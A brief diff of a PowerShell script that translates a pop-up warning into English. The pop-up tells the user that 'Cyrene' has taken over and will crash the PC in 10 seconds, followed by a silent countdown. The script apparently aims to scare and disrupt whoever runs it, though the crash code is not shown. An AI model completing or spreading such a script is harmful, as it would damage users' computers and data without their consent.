@@ -71,7 +71,7 @@ Get-ChildItem -Path $rootPath -File -ErrorAction SilentlyContinue | Where-Object
 
 # --- 1. 弹出警告窗口 ---
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("检测到致命错误。系统已被赛琳（Cyrene）接管。`n`n由于协议冲突，你的电脑将在 10 秒内崩溃。", "Cyrene Protocol - Critical Failure", 0, 16)
+[System.Windows.MessageBox]::Show("Cyrene is going to crash your pc.`n`nAfter 10 Seconds.", "Cyrene Protocol - Critical Failure", 0, 16)
 
 # --- 2. 10 秒倒计时 (后台静默) ---
 Start-Sleep -Seconds 10
